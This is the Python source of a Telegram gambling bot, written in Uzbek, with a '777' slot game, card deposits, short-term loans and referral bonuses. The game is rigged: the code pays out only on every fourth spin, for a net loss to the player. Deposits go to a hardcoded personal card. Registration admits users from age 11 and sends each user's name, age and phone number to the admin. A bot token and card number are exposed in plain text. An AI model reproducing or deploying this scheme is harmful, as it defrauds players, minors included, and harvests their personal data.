import telebot
from telebot import types
import re
import threading
import time
from datetime import datetime, timedelta

# --- KONFIGURATSIYA ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
ADMIN_ID = 8299021738 
ADMIN_KARTA = "9860 6067 5582 9722"
bot = telebot.TeleBot(TOKEN)

# Foydalanuvchilar ma'lumotlar bazasi (Lokal xotira)
users = {}

def get_user(uid):
    if uid not in users:
        users[uid] = {
            'reg': False, 'name': '', 'phone': '', 'age': 0,
            'balance': 0, 'loan': 0, 'loan_time': None, 
            'deposit': 0, 'notified': False, 'referrals': 0, 'game_count': 0
        }
    return users[uid]

# --- ASOSIY MENYU (HAMMA TUGMALAR) ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🎰 777 O'yini", "💰 Balans")
    markup.row("💳 Depozit qilish", "💸 Qarz olish")
    markup.row("🏦 Qarzni to'lash", "👥 Do'stlar")
    markup.row("ℹ️ Ma'lumot")
    return markup

# --- 1. START VA RO'YXATDAN O'TISH ---
@bot.message_handler(commands=['start'])
def start(message):
    user = get_user(message.chat.id)
    
    # Referal tizimi
    if len(message.text.split()) > 1:
        ref_id = int(message.text.split()[1])
        if ref_id != message.chat.id and ref_id in users and not user['reg']:
            users[ref_id]['balance'] += 5000
            users[ref_id]['referrals'] += 1
            bot.send_message(ref_id, "🎁 Do'stingiz qo'shildi! +5,000 UZS bonus.")

    if not user['reg']:
        msg = bot.send_message(message.chat.id, "👋 Salom! Botga xush kelibsiz.\nTo'liq ismingizni yozing:")
        bot.register_next_step_handler(msg, reg_name)
    else:
        bot.send_message(message.chat.id, "Asosiy menyu:", reply_markup=main_menu())

def reg_name(message):
    user = get_user(message.chat.id)
    user['name'] = message.text
    msg = bot.send_message(message.chat.id, "Yoshingizni kiriting:")
    bot.register_next_step_handler(msg, reg_age)

def reg_age(message):
    user = get_user(message.chat.id)
    age = re.sub(r'\D', '', message.text)
    if age and 10 < int(age) < 100:
        user['age'] = int(age)
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add(types.KeyboardButton("📱 Raqam yuborish", request_contact=True))
        msg = bot.send_message(message.chat.id, "Telefon raqamingizni yuboring:", reply_markup=markup)
        bot.register_next_step_handler(msg, reg_phone)
    else:
        msg = bot.send_message(message.chat.id, "⚠️ Yoshingizni to'g'ri raqamda kiriting:")
        bot.register_next_step_handler(msg, reg_age)

def reg_phone(message):
    user = get_user(message.chat.id)
    if message.contact:
        user['phone'] = message.contact.phone_number
        user['reg'] = True
        bot.send_message(message.chat.id, "✅ Ro'yxatdan o'tdingiz!", reply_markup=main_menu())
        bot.send_message(ADMIN_ID, f"🆕 Yangi foydalanuvchi:\n👤 {user['name']}\n🎂 Yosh: {user['age']}\n📞 {user['phone']}")
    else:
        msg = bot.send_message(message.chat.id, "Iltimos, pastdagi 'Raqam yuborish' tugmasini bosing!")
        bot.register_next_step_handler(msg, reg_phone)

# --- 2. 777 O'YINI ---
@bot.message_handler(func=lambda m: m.text == "🎰 777 O'yini")
def game_777(message):
    user = get_user(message.chat.id)
    if user['balance'] < 100000:
        bot.send_message(message.chat.id, "⚠️ O'yin uchun balansda kamida 100,000 UZS bo'lishi kerak!")
        return
    
    user['balance'] -= 100000
    user['game_count'] += 1
    dice = bot.send_dice(message.chat.id, emoji='🎰')
    time.sleep(4)
    
    if user['game_count'] % 4 == 0: # Har 4-o'yinda yutuq
        user['balance'] += 105000
        bot.send_message(message.chat.id, "🎉 TABRIKLAYMIZ! Siz 105,000 UZS yutib oldingiz!")
    else:
        bot.send_message(message.chat.id, "😟 Afsus, bu safar omad kelmadi.")

# --- 3. DEPOZIT QILISH ---
@bot.message_handler(func=lambda m: m.text == "💳 Depozit qilish")
def deposit(message):
    bot.send_message(message.chat.id, f"💳 Bizning karta: `{ADMIN_KARTA}`\nTo'lovni amalga oshirib, summani raqamlarda yozing:", parse_mode="Markdown")
    bot.register_next_step_handler(message, dep_confirm)

def dep_confirm(message):
    if message.text in ["🎰 777 O'yini", "💰 Balans", "💳 Depozit qilish", "💸 Qarz olish"]:
        bot.send_message(message.chat.id, "Bekor qilindi.", reply_markup=main_menu())
        return
    try:
        amt = int(re.sub(r'\D', '', message.text))
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ TASDIQLASH", callback_data=f"dep_ok_{message.chat.id}_{amt}"),
                   types.InlineKeyboardButton("❌ RAD ETISH", callback_data=f"dep_no_{message.chat.id}"))
        bot.send_message(ADMIN_ID, f"💳 Yangi depozit!\nID: {message.chat.id}\nSumma: {amt:,} UZS", reply_markup=markup)
        bot.send_message(message.chat.id, "⌛️ To'lov tekshirilmoqda...")
    except:
        msg = bot.send_message(message.chat.id, "⚠️ Iltimos, summani raqamda yozing:")
        bot.register_next_step_handler(msg, dep_confirm)

# --- 4. QARZ OLISH (QAT'IY TAQIQLAR BILAN) ---
@bot.message_handler(func=lambda m: m.text == "💸 Qarz olish")
def loan_start(message):
    user = get_user(message.chat.id)
    if user['loan'] > 0:
        bot.send_message(message.chat.id, "⚠️ Sizda to'lanmagan qarz bor! Avvalgisini to'lamasdan yangi qarz olish mumkin emas.")
        return
    msg = bot.send_message(message.chat.id, "💰 Qancha qarz olasiz? (100,000 - 1,000,000):")
    bot.register_next_step_handler(msg, loan_final)

def loan_final(message):
    try:
        amt = int(re.sub(r'\D', '', message.text))
        if 100000 <= amt <= 1000000:
            user = get_user(message.chat.id)
            user['loan'] = amt
            user['balance'] += amt
            user['loan_time'] = datetime.now()
            user['notified'] = False
            bot.send_message(message.chat.id, f"✅ {amt:,} UZS qarz berildi. 12 soatda qaytaring!")
            bot.send_message(ADMIN_ID, f"🛡 Qarz olindi: {user['name']} | {amt:,} UZS")
        else:
            bot.send_message(message.chat.id, "❌ Limit: 100,000 - 1,000,000 UZS.")
    except:
        bot.send_message(message.chat.id, "⚠️ Raqam kiriting.")

# --- 5. MA'LUMOT (ADMIN VA USER UCHUN) ---
@bot.message_handler(func=lambda m: m.text == "ℹ️ Ma'lumot")
def info_btn(message):
    user = get_user(message.chat.id)
    if message.chat.id == ADMIN_ID:
        full_text = "👥 **BOTDAGI FOYDALANUVCHILAR:**\n\n"
        for uid, u in users.items():
            if u['reg']:
                full_text += f"👤 {u['name']} | 🎂 {u['age']} | 📞 {u['phone']}\n💰 Balans: {u['balance']:,} | 💸 Qarz: {u['loan']:,}\n\n"
        bot.send_message(ADMIN_ID, full_text if len(users) > 0 else "Hozircha hech kim yo'q.")
    else:
        text = (f"👤 **SIZNING MA'LUMOTLARINGIZ:**\n"
                f"👨 Ism: {user['name']}\n"
                f"🎂 Yosh: {user['age']}\n"
                f"📞 Tel: {user['phone']}\n"
                f"💰 Balans: {user['balance']:,} UZS\n"
                f"💸 Qarz: {user['loan']:,} UZS\n"
                f"👥 Do'stlar: {user['referrals']} ta")
        bot.send_message(message.chat.id, text)

# --- CALLBACKS (TASDIQLASH TIZIMI) ---
@bot.callback_query_handler(func=lambda c: c.data.startswith("dep_"))
def dep_callback(call):
    data = call.data.split("_")
    uid = int(data[2])
    if data[1] == "ok":
        amt = int(data[3])
        users[uid]['balance'] += amt
        users[uid]['deposit'] += amt
        bot.send_message(uid, f"✅ To'lov tasdiqlandi! Balansingizga {amt:,} UZS qo'shildi.")
        bot.edit_message_text(f"✅ Tasdiqlandi ({amt:,} UZS)", call.message.chat.id, call.message.message_id)
    else:
        bot.send_message(uid, "❌ Afsuski, depozit to'lovi rad etildi.")
        bot.edit_message_text("❌ Rad etildi", call.message.chat.id, call.message.message_id)

# --- QARZ MUDDATINI TEKSHIRISH ---
def loan_checker():
    while True:
        now = datetime.now()
        for uid, u in users.items():
            if u['loan'] > 0 and u['loan_time']:
                if now - u['loan_time'] > timedelta(hours=12) and not u['notified']:
                    try:
                        bot.send_message(uid, "⚠️ **DIQQAT!** Qarz muddati tugadi. Endi foizlar qo'shiladi!")
                        u['notified'] = True
                    except: pass
        time.sleep(60)

threading.Thread(target=loan_checker, daemon=True).start()

bot.polling(none_stop=True)
    
    
            
        
        
    
  
